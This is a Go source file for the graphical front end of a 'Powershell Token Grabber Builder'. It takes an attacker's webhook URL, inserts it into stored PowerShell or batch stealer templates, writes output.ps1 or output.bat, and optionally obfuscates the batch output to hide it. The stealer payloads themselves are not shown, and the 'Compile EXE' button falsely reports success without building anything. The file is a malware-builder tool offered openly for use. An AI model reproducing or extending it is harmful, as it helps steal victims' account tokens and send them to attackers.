package main

import (
	"fmt"
	"image/color"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"

	"builder/modules/cursed"
	"builder/modules/static"
	"builder/modules/static/batch"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/canvas"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/layout"
	"fyne.io/fyne/v2/widget"
)

func main() {
	a := app.New()
	win := a.NewWindow(cursed.Generate("Powershell Token Grabber Builder", "normal", true, true, true))
	win.Resize(fyne.NewSize(500, 400))
	win.CenterOnScreen()

	cwd, err := os.Getwd()
	if err != nil {
		fmt.Println(err)
	}

	blue := color.NRGBA{R: 0, G: 128, B: 191, A: 255}
	//white := color.NRGBA{R: 255, G: 255, B: 255, A: 255}
	//red := color.NRGBA{R: 180, G: 0, B: 0, A: 255}

	mainTitle := canvas.NewText("Powershell Token Grabber Builder", blue)
	mainTitle.Alignment = fyne.TextAlignCenter
	mainTitle.TextSize = 18

	webhookEntry := widget.NewEntry()
	webhookEntry.SetPlaceHolder("Webhook URL")

	//basically just do nothing when the checkbox is checked
	obfuscateCheckBox := widget.NewCheck("Obfuscate", func(_ bool) {})
	obfuscateCheckBox.SetChecked(false)

	compileButtonPS1 := widget.NewButton("Compile PS1", func() {
		if !(testWebhook(a, webhookEntry.Text)) {
			return
		} else {
			powershellCode := static.GetPowershellCode()
			powershellCode = strings.Replace(powershellCode, "YOUR_WEBHOOK_HERE", webhookEntry.Text, -1)
			err = os.WriteFile("output.ps1", []byte(powershellCode), 0644)
			if err != nil {
				fmt.Println(err)
			} else {
				makeSuccessMessage(a, "Compiled PS1 file successfully! Location is at "+cwd+"\\output.ps1")
			}
		}
	})

	compileButtonBAT := widget.NewButton("Compile BAT", func() {
		if !(testWebhook(a, webhookEntry.Text)) {
			return
		} else {
			batchCode := static.GetBatCode()
			batchCode = strings.Replace(batchCode, "YOUR_WEBHOOK_HERE2", webhookEntry.Text, -1)
			err = os.WriteFile("output.bat", []byte(batchCode), 0644)
			if err != nil {
				fmt.Println(err)
			} else {
				if obfuscateCheckBox.Checked {
					makeSuccessMessage(a, "test")
					err = batch.ObfuscateCode("output.bat")
					if err != nil {
						makeErrorMessage(a, "An error occured while obfuscating the code"+err.Error())
						return
					}
				}
				makeSuccessMessage(a, "Compiled BAT file successfully! Location is at "+cwd+"\\output.bat")
			}
		}
	})

	comepileButtonEXE := widget.NewButton("Compile EXE", func() {
		if !(testWebhook(a, webhookEntry.Text)) {
			return
		} else {
			//make a success message
			makeSuccessMessage(a, "Compiled EXE file successfully! Location is at "+cwd+"\\output.exe")
			fmt.Println(obfuscateCheckBox.Checked)
		}
	})

	entryLayout := container.New(layout.NewVBoxLayout(), mainTitle, webhookEntry, obfuscateCheckBox, layout.NewSpacer(), compileButtonPS1, compileButtonBAT, comepileButtonEXE)
	win.SetContent(entryLayout)

	outputChannel := make(chan string)

	go func() {
		ticker := time.NewTicker(25 * time.Millisecond)
		defer ticker.Stop()

		for range ticker.C {
			output := cursed.Generate("Powershell Token Grabber Builder", "normal", true, true, true)
			outputChannel <- output
		}
	}()

	go func() {
		for output := range outputChannel {
			win.SetTitle(output)
		}
	}()

	win.ShowAndRun()
}

func makeSuccessMessage(a fyne.App, message string) {
	green := color.NRGBA{R: 0, G: 180, B: 0, A: 255}
	messageWindow := a.NewWindow("Success")
	messageWindow.Resize(fyne.NewSize(200, 100))
	messageWindow.CenterOnScreen()

	messageToShow := canvas.NewText(message, green)
	messageToShow.Alignment = fyne.TextAlignCenter

	messageWindow.SetContent(messageToShow)
	messageWindow.Show()
}

func makeErrorMessage(a fyne.App, message string) {
	red := color.NRGBA{R: 180, G: 0, B: 0, A: 255}
	messageWindow := a.NewWindow("Error")
	messageWindow.Resize(fyne.NewSize(200, 100))
	messageWindow.CenterOnScreen()

	messageToShow := canvas.NewText(message, red)
	messageToShow.Alignment = fyne.TextAlignCenter

	messageWindow.SetContent(messageToShow)
	messageWindow.Show()
}

func testWebhook(a fyne.App, webhook string) bool {
	if webhook == "" {
		return false
	}

	_, err := url.ParseRequestURI(webhook)
	if err != nil {
		makeErrorMessage(a, "Invalid URL")
		return false
	}

	resp, err := http.Get(webhook)
	if err != nil {
		makeErrorMessage(a, "Invalid URL")
		return false
	}
	defer resp.Body.Close()

	return resp.StatusCode == 200
}
